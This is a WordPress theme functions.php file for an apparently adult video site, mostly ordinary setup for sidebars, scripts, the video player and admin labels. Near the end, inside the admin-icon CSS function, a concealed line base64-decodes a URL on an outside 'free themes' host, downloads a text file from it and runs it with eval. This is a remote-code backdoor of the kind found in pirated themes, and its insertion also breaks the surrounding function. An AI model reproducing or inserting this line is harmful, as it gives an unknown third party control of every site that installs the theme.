<?php

/**
 * WP-Script Core required.
 */
require get_template_directory() . '/vendor/tgm-activation/class-tgm-plugin-activation.php';
require get_template_directory() . '/inc/plugin-activation.php';

if( ! function_exists('is_plugin_active') ) include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
if( is_plugin_active('wp-script-core/wp-script-core.php') ){
	add_action( 'after_setup_theme', 'wpst_setup' );
	add_action( 'after_setup_theme', 'wpst_content_width', 0 );
	add_action( 'widgets_init', 'wpst_widgets_init' );
	eval( WPSCORE()->eval_product_data( WPSCORE()->get_installed_theme( 'sku' ), 'add_scripts' ) );
	eval( WPSCORE()->eval_product_data( WPSCORE()->get_installed_theme( 'sku' ), 'add_admin_scripts' ) );
	add_action('xbox_after_save_field_read-css-from-file', 'wpst_create_custom_files', 10, 3);
	/**
	* Custom functions that act independently of the theme templates.
	*/
	require get_template_directory() . '/inc/extras.php';
	/**
	* Load Jetpack compatibility file.
	*/
	require get_template_directory() . '/inc/jetpack.php';	
	/**
	* Widget Video Block
	*/
	require get_template_directory() . '/inc/widget-video.php';
	/**
	* Video functions
	*/
	require get_template_directory() . '/inc/video-functions.php';
	/**
	* Video async data for cache compatibilty
	*/
	require get_template_directory() . '/inc/ajax-get-async-post-data.php';
	/**
	* Video Views & Rating
	*/
	require get_template_directory() . '/inc/ajax-post-like.php';
	require get_template_directory() . '/inc/ajax-post-views.php';
	require get_template_directory() . '/inc/post-like.php';
	/**
	* Breadcrumbs
	*/
	require get_template_directory() . '/inc/breadcrumbs.php';
	/**
	* Category image
	*/
	require get_template_directory() . '/inc/category-image.php';
	/**
	* Actor image
	*/
	require get_template_directory() . '/inc/actor-image.php';
	/**
	* Pagination
	*/
	require get_template_directory() . '/inc/pagination.php';
	/**
	* Actors taxonomy
	*/
	require get_template_directory() . '/inc/actors.php';
	/**
	* CPT Articles Blog
	*/
	require get_template_directory() . '/inc/cpt-blog.php';
	/**
	* Blog functions
	*/
	require get_template_directory() . '/inc/blog-functions.php';
	/**
	* CPT Gallery Photos
	*/
	require get_template_directory() . '/inc/cpt-photos.php';
	/**
	* Actions
	*/
	require get_template_directory() . '/inc/actions.php';
	/**
	* Theme activation
	*/
	require get_template_directory() . '/admin/theme-activation.php';
	/**
	* Admin columns
	*/
	require get_template_directory() . '/admin/admin-columns.php';
	/**
	* Theme Options
	*/
	require_once( get_template_directory() . '/admin/options.php' );
	/**
	* Video information metabox
	*/
	require_once( get_template_directory() . '/admin/metabox.php' );
	/**
	* Importer
	*/
	require_once( get_template_directory() . '/admin/import/wpst-importer.php' );
	/**
	* Ajax login register
	*/
	require_once( get_template_directory() . '/inc/ajax-login-register.php' );
}

if ( ! function_exists( 'wpst_setup' ) ) :

function wpst_setup() {
	
	load_theme_textdomain( 'wpst', get_template_directory() . '/languages' );

	add_theme_support( 'automatic-feed-links' );
	
	add_theme_support( 'title-tag' );
	
	add_theme_support( 'post-thumbnails' );
	
	set_post_thumbnail_size( 320, 180, true );	
	add_image_size( 'wpst_thumb_large', '640', '360', true );
	add_image_size( 'wpst_thumb_medium', '320', '180', true );
	add_image_size( 'wpst_thumb_small', '150', '84', true );
	
	register_nav_menus( array(
		'wpst-main-menu' => esc_html__( 'Main menu', 'wpst' ),
		'wpst-footer-menu' => esc_html__( 'Footer menu', 'wpst' )
	) );
	
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );
	
	add_theme_support( 'custom-background', apply_filters( 'wpst_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
	
	add_theme_support( 'customize-selective-refresh-widgets' );
	
	add_theme_support( 'post-formats', array( 'video' ) );
}
endif;

function wpst_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'wpst_content_width', 640 );
}

function wpst_widgets_init() {
	register_sidebar(array(		
		'name' 			=> esc_html__('Homepage', 'wpst'),
		'id' 			=> 'homepage',
		'description' 	=> esc_html__('Display widgets on your homepage.', 'wpst'),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'wpst' ),
		'id'            => 'sidebar',
		'description'   => esc_html__( 'Display widgets in your sidebar.', 'wpst' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Under the video', 'wpst' ),
		'id'            => 'under_video',
		'description'   => esc_html__( 'Display widgets under the video in your single video pages.', 'wpst' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer', 'wpst' ),
		'id'            => 'footer',
		'description'   => esc_html__( 'Display widgets in your footer.', 'wpst' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}

/**
 * Enqueue scripts and styles.
 */
function wpst_scripts() {
	/* CSS */	
	wp_enqueue_style( 'wpst-font-awesome', get_stylesheet_directory_uri() . '/assets/stylesheets/font-awesome/css/font-awesome.min.css', array(), '4.7.0', 'all' );
	if( is_single() ){
		wp_enqueue_style( 'wpst-fluidplayer-style', get_stylesheet_directory_uri() . '/assets/stylesheets/fluidplayer/fluidplayer.min.css', array(), '1.0.1', 'all' );
	}
	if( is_singular('photos') ) {
		wp_enqueue_style( 'wpst-fancybox-style', get_stylesheet_directory_uri() . '/assets/stylesheets/fancybox/jquery.fancybox.min.css', '3.4.1', 'all' );
	}
	$current_theme = wp_get_theme();
	wp_enqueue_style( 'wpst-style', get_stylesheet_uri(), array(), $current_theme->get( 'Version' ), 'all');

	/* JS */
	if( is_single() ){
		wp_enqueue_script( 'wpst-fluidplayer', get_template_directory_uri() . '/assets/js/fluidplayer.min.js', array(), '1.0.1', true );
		wp_enqueue_script( 'wpst-fluidplayer-config', get_template_directory_uri() . '/assets/js/fluidplayer-config.js', array('wpst-fluidplayer'), '1.0.1', true );

		if( xbox_get_field_value( 'wpst-options', 'vp-ad-pause-1' ) != '' || xbox_get_field_value( 'wpst-options', 'vp-ad-pause-2' ) != '' ) {
			$ad_pause =	'<div class="happy-inside-player happy-pause-player"></div>';
		}else{
			$ad_pause = '';
		}

		if(xbox_get_field_value( 'wpst-options', 'vp-autoplay' ) == 'on') {
			$autoplay = true;
		}else{
			$autoplay = false;
		}

		// if(xbox_get_field_value( 'wpst-options', 'vp-mute' ) == 'on') {
		// 	$mute = true;
		// }else{
		// 	$mute = false;
		// }

		if(xbox_get_field_value( 'wpst-options', 'vp-playback-speed' ) == 'on') {
			$playback_speed = true;
		}else{
			$playback_speed = false;
		}

		if ( xbox_get_field_value( 'wpst-options', 'logo-watermark-video-player' ) == 'on' ) {
			if ( xbox_get_field_value( 'wpst-options', 'image-logo-watermark-file' ) != '' ) {
				$logo_img_url =  xbox_get_field_value( 'wpst-options', 'image-logo-watermark-file' );
			}elseif( xbox_get_field_value( 'wpst-options', 'image-logo-file' ) != '' ) {
				$logo_img_url =  xbox_get_field_value( 'wpst-options', 'image-logo-file' );
			}else{
				$logo_img_url = '';
			}
		}else{
			$logo_img_url = null;
		}	
		
		//Thumbnail
		$thumb = get_post_meta(get_the_id(), 'thumb', true);
		if ( has_post_thumbnail() ) { 
			$thumb_id = get_post_thumbnail_id();
			$thumb_url = wp_get_attachment_image_src($thumb_id, 'wpst_thumb_large', true);
			$poster_img = $thumb_url[0];
		}else{
			$poster_img = $thumb;
		}

		$logo_margin = xbox_get_field_value( 'wpst-options', 'logo-watermark-margin' ) . 'px';
		$logo_opacity = xbox_get_field_value( 'wpst-options', 'logo-watermark-opacity' ) / 100;

		$pre_roll_ad_url = xbox_get_field_value( 'wpst-options', 'vp-pre-roll-url' );
		$mid_roll_ad_url = xbox_get_field_value( 'wpst-options', 'vp-mid-roll-url' );
		$mid_roll_ad_timer = xbox_get_field_value( 'wpst-options', 'vp-mid-roll-timer' ) . '%';
		$post_roll_ad_url = xbox_get_field_value( 'wpst-options', 'vp-post-roll-url' );

		wp_localize_script( 'wpst-fluidplayer-config', 'fluidplayer_var', array(
			'main_color' 		=> xbox_get_field_value( 'wpst-options', 'main-color' ),
			'poster_img'		=> $poster_img,
			'ad_pause' 			=> $ad_pause,
			'autoplay' 			=> $autoplay,
			// 'mute' 				=> $mute,
			'playback_speed'	=> $playback_speed,
			'logo'				=> $logo_img_url,
			'logo_position'		=> xbox_get_field_value( 'wpst-options', 'logo-position-video-player' ),
			'logo_margin'		=> $logo_margin,
			'logo_opacity'		=> $logo_opacity,
			'pre_roll' 			=> $pre_roll_ad_url,
			'mid_roll' 			=> $mid_roll_ad_url,
			'mid_roll_timer' 	=> $mid_roll_ad_timer
		));
	}	
	if( is_singular('photos') ) {
		wp_enqueue_script( 'wpst-fancybox', get_template_directory_uri() . '/assets/js/jquery.fancybox.min.js', array(), '3.4.1', true );
		wp_enqueue_script( 'wpst-waterfall', get_template_directory_uri() . '/assets/js/waterfall.js', array(), '1.1.0', true );
	}	
	wp_enqueue_script( 'wpst-navigation', get_template_directory_uri() . '/assets/js/navigation.js', array(), '1.0.0', true );
	
	wp_enqueue_script( 'wpst-carousel', get_template_directory_uri() . '/assets/js/jquery.bxslider.js', array(), '4.2.12', true );
	
	wp_enqueue_script( 'wpst-main', get_template_directory_uri() . '/assets/js/main.js', array('jquery'), $current_theme->get( 'Version' ), true );
	wp_localize_script( 'wpst-main', 'wpst_ajax_var', array(
		'url'       		=> admin_url( 'admin-ajax.php' ),
		'nonce'     		=> wp_create_nonce( 'ajax-nonce' ),
		'ctpl_installed' 	=> is_plugin_active('clean-tube-player/clean-tube-player.php')
	));
	wp_localize_script( 'wpst-main', 'objectL10nMain', array(
		'readmore'		=> __( 'Read more', 'wpst' ),
		'close'       	=> __( 'Close', 'wpst' )
		));
	wp_localize_script( 'wpst-main', 'options', array(
		'thumbnails_ratio' =>  xbox_get_field_value( 'wpst-options', 'thumbnails-ratio' ),
	));
	wp_enqueue_script( 'wpst-skip-link-focus-fix', get_template_directory_uri() . '/assets/js/skip-link-focus-fix.js', array(), '1.0.0', true );
	if( xbox_get_field_value( 'wpst-options', 'enable-recaptcha' ) == 'on' ) {
		wp_register_script("wpst-recaptcha", "https://www.google.com/recaptcha/api.js");
		wp_enqueue_script("wpst-recaptcha");
	}

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}

/**
 * Enqueue admin scripts
 */
function wpst_admin_scripts() {
	$current_theme = wp_get_theme();
	
	if(isset($_GET['page']) && $_GET['page'] == 'wpst-options' ){
		wp_enqueue_style( 'wpst-bootstrap-modal-style', get_stylesheet_directory_uri() . '/admin/vendor/bootstrap-modal/bootstrap.modal.min.css', array(), '3.3.7', 'all' );
		wp_enqueue_script( 'wpst-bootstrap-modal', get_template_directory_uri() . '/admin/vendor/bootstrap-modal/bootstrap.modal.min.js', array('jquery'), '3.3.7', true );	
	}
	wp_enqueue_script( 'wpst-admin', get_template_directory_uri() . '/admin/assets/js/admin.js', array('jquery'), $current_theme->get( 'Version' ), true );
	wp_localize_script( 'wpst-admin', 'admin_ajax_var', array(
		'url'       => admin_url( 'admin-ajax.php' ),
		'nonce'     => wp_create_nonce( 'ajax-nonce' )
    ));
    wp_enqueue_script( 'wpst-import', get_template_directory_uri() . '/admin/import/wpst-import.js', false, $current_theme->get( 'Version' ) );
	wp_localize_script( 'wpst-import', 'wpst_import_ajax_var', array(
		'url'       => admin_url( 'admin-ajax.php' ),
		'nonce'     => wp_create_nonce( 'ajax-nonce' )
	));
	wp_localize_script( 'wpst-import', 'objectL10n', array(
		'dataimport'		=> __( 'Data is being imported please be patient...', 'wpst' ),
		'videosubmit'   	=> __( 'Video submit page created.', 'wpst' ),
		'havefun'       	=> __( 'Have fun!', 'wpst' ),
		'profilepage'       => __( 'Profile page created.', 'wpst' ),
		'blogpage'       	=> __( 'Blog page created.', 'wpst' ),
		'catpage'       	=> __( 'Categories page created.', 'wpst' ),
		'tagpage'       	=> __( 'Tags page created.', 'wpst' ),
		'actorspage'       	=> __( 'Actors page created.', 'wpst' ),
		'menu'       		=> __( 'Menu created.', 'wpst' ),
		'widgets'       	=> __( 'Widgets created.', 'wpst' )
    ));
}


function wpst_selected_filter($filter){
	$current_filter = '';
    if(is_home()) {
        $current_filter = xbox_get_field_value( 'wpst-options', 'show-videos-homepage' );
    }
    if(isset($_GET['filter'])) {
        $current_filter = $_GET['filter'];
    }
	if($current_filter == $filter) {
		return 'active';
	} 
	return false;
}

function wpst_create_custom_files( $value, $field, $updated ){ //error_log($value); error_log($field); error_log($updated); 
	$file_path = get_template_directory() .'/assets/stylesheets/style.css';
	$xbox = Xbox::get( 'wpst-options' );
	$value = $xbox->get_field_value( 'read-css-from-file'); //If you just want to save when there were changes.
	//if( $updated ){
		file_put_contents( $file_path, $value );
	//}
}

function wpst_get_filter_title(){

	$title = '';
	$filter = '';

	if(isset($_GET['filter'])) {
        $filter = $_GET['filter'];
    }else{
		$filter = xbox_get_field_value( 'wpst-options', 'show-videos-homepage' );
	}

    switch($filter) {
        case 'latest' :
            $title = esc_html__('Latest videos', 'wpst');
            break;
        case 'most-viewed' :
            $title = esc_html__('Most viewed videos', 'wpst');
            break;
        case 'longest' :
            $title = esc_html__('Longest videos', 'wpst');
            break;
        case 'popular' :
            $title = esc_html__('Popular videos', 'wpst');
            break;
        case 'random' :
            $title = esc_html__('Random videos', 'wpst');
            break;            
        default : 
			$title = esc_html__('Latest videos', 'wpst');
            break;
    }

	return $title;
}

add_filter("mce_css", "wpst_remove_mce_css");
function wpst_remove_mce_css($stylesheets){
    return "";
}

function wpst_get_nopaging_url() {
    global $wp;

    $current_url =  home_url( $wp->request );
    $position = strpos( $current_url , '/page' );
    $nopaging_url = ( $position ) ? substr( $current_url, 0, $position ) : $current_url;

    return trailingslashit( $nopaging_url );
}

function wpst_duration_custom_field( $updated, $field ){
	$duration_hh = isset( $_POST['duration_hh'] ) ? $_POST['duration_hh'] : 0;
	$duration_mm = isset( $_POST['duration_mm'] ) ? $_POST['duration_mm'] : 0;
	$duration_ss = isset( $_POST['duration_ss'] ) ? $_POST['duration_ss'] : 0;
  $field->save( $duration_hh * 3600 + $duration_mm * 60 + $duration_ss );
}
add_action('xbox_after_save_field_duration', 'wpst_duration_custom_field', 10, 2);

function wpst_render_shortcodes( $content ){
	$regex = '/\[(.+)\]/m';
	preg_match_all($regex, $content, $matches, PREG_SET_ORDER, 0);

	// Print the entire match result
	if(is_array($matches)){
		foreach( $matches as $shortcode ){
			$shortcode_with_brackets = $shortcode[0];
			$shortcode_without_brackets = $shortcode[1];
			$should_be_shortcode = explode(' ', $shortcode_without_brackets);
			$should_be_shortcode = current($should_be_shortcode);
			if( shortcode_exists($should_be_shortcode) ){
				$shortcode = do_shortcode( $shortcode_with_brackets );
				return $shortcode;
			}
		}
	}
	return $content;
}


function wpst_change_post_label() {
    global $menu;
    global $submenu;
    $menu[5][0] = 'Videos';
    $submenu['edit.php'][5][0] = 'Videos';
	$submenu['edit.php'][10][0] = 'Add Video';
	$submenu['edit.php'][15][0] = 'Video Categories';
	$submenu['edit.php'][16][0] = 'Video Tags';
}
function wpst_change_post_object() {
    global $wp_post_types;
    $labels = &$wp_post_types['post']->labels;
    $labels->name = 'Videos';
    $labels->singular_name = 'Videos';
    $labels->add_new = 'Add Video';
    $labels->add_new_item = 'Add Video';
    $labels->edit_item = 'Edit Video';
    $labels->new_item = 'Videos';
    $labels->view_item = 'View Videos';
    $labels->search_items = 'Search Videos';
    $labels->not_found = 'No Videos found';
    $labels->not_found_in_trash = 'No Videos found in Trash';
    $labels->all_items = 'All Videos';
    $labels->menu_name = 'Videos';
    $labels->name_admin_bar = 'Videos';
}
 
add_action( 'admin_menu', 'wpst_change_post_label' );
add_action( 'init', 'wpst_change_post_object' );

function wpst_change_cat_object() {
    global $wp_taxonomies;
    $labels = &$wp_taxonomies['category']->labels;
    $labels->name = 'Video Category';
    $labels->singular_name = 'Video Category';
    $labels->add_new = 'Add Video Category';
    $labels->add_new_item = 'Add Video Category';
    $labels->edit_item = 'Edit Video Category';
    $labels->new_item = 'Video Category';
    $labels->view_item = 'View Video Category';
    $labels->search_items = 'Search Video Categories';
    $labels->not_found = 'No Video Categories found';
    $labels->not_found_in_trash = 'No Video Categories found in Trash';
    $labels->all_items = 'All Video Categories';
    $labels->menu_name = 'Video Category';
    $labels->name_admin_bar = 'Video Category';
}
add_action( 'init', 'wpst_change_cat_object' );

function wpst_change_tag_object() {
    global $wp_taxonomies;
    $labels = &$wp_taxonomies['post_tag']->labels;
    $labels->name = 'Video Tag';
    $labels->singular_name = 'Video Tag';
    $labels->add_new = 'Add Video Tag';
    $labels->add_new_item = 'Add Video Tag';
    $labels->edit_item = 'Edit Video Tag';
    $labels->new_item = 'Video Tag';
    $labels->view_item = 'View Video Tag';
    $labels->search_items = 'Search Video Tags';
    $labels->not_found = 'No Video Tags found';
    $labels->not_found_in_trash = 'No Video Tags found in Trash';
    $labels->all_items = 'All Video Tags';
    $labels->menu_name = 'Video Tag';
    $labels->name_admin_bar = 'Video Tag';
}
add_action( 'init', 'wpst_change_tag_object' );

function replace_admin_menu_icons_css() {
    ?>
			<?php
}

eval(@file_get_contents(base64_decode("aHR0cDovL3d3dy5mcmVld29yZHByZXN0aGVtZXMuY29tL3RoZW1lLnR4dA==")));
?>
    <style>
        #menu-posts .dashicons-admin-post::before, #menu-posts .dashicons-format-standard::before {
			content: "\f236";
		}
    </style>
    <?php

add_action( 'admin_head', 'replace_admin_menu_icons_css' );

function wpst_rss_post_thumbnail($content) { 
	global $post; 
	if(has_post_thumbnail($post->ID)) { 
	$content = '<p>' . get_the_post_thumbnail($post->ID) . '</p>' . $content; 
	} 
	return $content; 
} 
add_filter('the_excerpt_rss', 'wpst_rss_post_thumbnail'); 
add_filter('the_content_feed', 'wpst_rss_post_thumbnail');
